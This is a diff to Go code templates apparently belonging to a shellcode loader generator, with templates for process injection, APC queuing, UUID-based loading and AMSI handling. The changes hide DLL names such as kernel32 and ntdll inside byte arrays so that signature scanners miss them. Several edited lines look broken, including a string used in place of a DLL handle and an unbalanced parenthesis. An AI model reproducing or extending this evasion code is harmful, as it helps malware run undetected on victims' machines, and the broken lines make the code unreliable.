@@ -463,7 +463,7 @@ func Header() string {
 
 	{{.Variables.AMSI_Function}}
 
-	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")
+	var {{.Variables.procReadProcessMemory}} = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("ReadProcessMemory")
 
 	func {{.Variables.FindAddress}}() uintptr {
 		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
@@ -485,7 +485,7 @@ func Header() string {
 	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
 		var nBytesRead int
 		buf := make([]uint8, nSize)
-		ret, _, _ := procReadProcessMemory.Call(
+		ret, _, _ := {{.Variables.procReadProcessMemory}}.Call(
 			uintptr(hProcess),
 			lpBaseAddress,
 			uintptr(unsafe.Pointer(&buf[0])),
@@ -898,8 +898,8 @@ func Syscall_CreateFiber() string {
 	return `
 	func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte){
 
-		{{.Variables.kernel32}} := windows.NewLazySystemDLL("kernel32")
-		{{.Variables.ntdll}} := windows.NewLazySystemDLL("ntdll.dll")
+		{{.Variables.kernel32}} := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
+		{{.Variables.ntdll}} := windows.NewLazySystemDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
 
 		{{.Variables.VirtualAlloc}} := {{.Variables.kernel32}}.NewProc("VirtualAlloc")
 		{{.Variables.VirtualProtect}} := {{.Variables.kernel32}}.NewProc("VirtualProtect")
@@ -938,7 +938,7 @@ func Syscall_EnumLoadedModules() string {
 		{{.Variables.addrNO}}, _ := windows.VirtualAlloc(uintptr(0), uintptr(len({{.Variables.raw_bin}})), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 
-		{{.Variables.ntdll}} := windows.NewLazySystemDLL("ntdll")
+		{{.Variables.ntdll}} := windows.NewLazySystemDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
 		{{.Variables.RtlCopyMemory}} := {{.Variables.ntdll}}.NewProc("RtlCopyMemory")
 
 		{{.Variables.RtlCopyMemory}}.Call({{.Variables.addrNO}}, (uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}[0])), uintptr(len({{.Variables.raw_bin}})))
@@ -947,7 +947,7 @@ func Syscall_EnumLoadedModules() string {
 		var {{.Variables.oldProtect}} uint32
 		windows.VirtualProtect({{.Variables.addrNO}}, uintptr(len({{.Variables.raw_bin}})), windows.PAGE_EXECUTE_READ, &{{.Variables.oldProtect}})
 		
-		{{.Variables.kernel32}} := windows.NewLazySystemDLL("kernel32")
+		{{.Variables.kernel32}} := (string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
 		{{.Variables.GetCurrentProcess}} := {{.Variables.kernel32}}.NewProc("GetCurrentProcess")
 		{{.Variables.handle}}, _, _ := {{.Variables.GetCurrentProcess}}.Call()
 
@@ -971,8 +971,8 @@ func Syscall_UUIDLoader() string {
 
 		{{.Variables.uuids}} := {{.Variables.FunctionName2}}({{.Variables.raw_bin}})
 
-		{{.Variables.kernel32}} := windows.NewLazySystemDLL("kernel32")
-		{{.Variables.rpcrt4}} := windows.NewLazySystemDLL("Rpcrt4.dll")
+		{{.Variables.kernel32}} := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
+		{{.Variables.rpcrt4}} := windows.NewLazySystemDLL(string([]byte{'r', 'p', 'c', 'r', 't', '4', '.', 'd', 'l', 'l',}))
 
 		{{.Variables.heapCreate}} := {{.Variables.kernel32}}.NewProc("HeapCreate")
 		{{.Variables.heapAlloc}} := {{.Variables.kernel32}}.NewProc("HeapAlloc")
@@ -1035,8 +1035,8 @@ func Syscall_UUIDLoader() string {
 func Syscall_RtlCopy() string {
 	return `
 	func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte){
-		{{.Variables.ntdll}} := windows.NewLazySystemDLL("ntdll.dll")
-		{{.Variables.kernel32}} := windows.NewLazySystemDLL("kernel32")
+		{{.Variables.ntdll}} := windows.NewLazySystemDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
+		{{.Variables.kernel32}} := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
 		{{.Variables.RtlCopyMemory}} := {{.Variables.ntdll}}.NewProc("RtlCopyMemory")
 		{{.Variables.VirtualAlloc}} := {{.Variables.kernel32}}.NewProc("VirtualAlloc")
 
@@ -1079,8 +1079,8 @@ func Syscall_NtQueueAPCThreadEx_Local() string {
 
 	func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte){
 
-		{{.Variables.kernel32}} := windows.NewLazySystemDLL("kernel32.dll")
-		{{.Variables.ntdll}} := windows.NewLazySystemDLL("ntdll.dll")
+		{{.Variables.kernel32}} := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
+		{{.Variables.ntdll}} := windows.NewLazySystemDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
 		{{.Variables.RtlCopyMemory}} := {{.Variables.ntdll}}.NewProc("RtlCopyMemory")
 		{{.Variables.NtQueueApcThreadEx}} := {{.Variables.ntdll}}.NewProc("NtQueueApcThreadEx")
 		{{.Variables.GetCurrentThread}} := {{.Variables.kernel32}}.NewProc("GetCurrentThread")
@@ -1196,9 +1196,9 @@ func KnownDLL_Refresh() string {
 			}
 		}
 
-		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
-		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
-		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")
+		var procNtOpenSection = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})).NewProc("NtOpenSection")
+		var procNtMapViewOfSection = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})).NewProc("NtMapViewOfSection")
+		var procNtUnmapViewOfSection = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})).NewProc("NtUnmapViewOfSection")
 
 		type sstring struct {
 			PWstr *uint16
@@ -1313,11 +1313,14 @@ func Pipe_Injection() string {
 func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte) {
 	{{.Variables.program}} := "{{.Variables.processpath}}"
 	{{.Variables.shellcode}}  := {{.Variables.raw_bin}}
-	{{.Variables.kernel32}} := windows.NewLazySystemDLL("kernel32")
-	{{.Variables.ntdll}} := windows.NewLazySystemDLL("ntdll")
-	{{.Variables.VirtualAllocEx}} := {{.Variables.kernel32}}.NewProc("VirtualAllocEx")
-	{{.Variables.VirtualProtectEx}} := {{.Variables.kernel32}}.NewProc("VirtualProtectEx")
-	{{.Variables.WriteProcessMemory}} := {{.Variables.kernel32}}.NewProc("WriteProcessMemory")
+	{{.Variables.kernel32}} := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
+	{{.Variables.ntdll}} := windows.NewLazySystemDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
+	{{.Variables.VirtualAllocEx}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc
+	("VirtualAllocEx")
+	{{.Variables.VirtualProtectEx}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc
+	("VirtualProtectEx")
+	{{.Variables.WriteProcessMemory}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc
+	("WriteProcessMemory")
 	{{.Variables.NtQueryInformationProcess}} := {{.Variables.ntdll}}.NewProc("NtQueryInformationProcess")
 
 	var {{.Variables.stdInRead}} windows.Handle
@@ -1616,8 +1619,8 @@ func Syscall_CreateThread() string {
 	// test
 	func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte){
 
-		{{.Variables.kernel32}} := windows.NewLazySystemDLL("kernel32")
-		{{.Variables.ntdll}} := windows.NewLazySystemDLL("ntdll")
+		{{.Variables.kernel32}} := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
+		{{.Variables.ntdll}} := windows.NewLazySystemDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})))
 
 		{{.Variables.VirtualAlloc}} := {{.Variables.kernel32}}.NewProc("VirtualAlloc")
 		{{.Variables.VirtualProtect}} := {{.Variables.kernel32}}.NewProc("VirtualProtect")
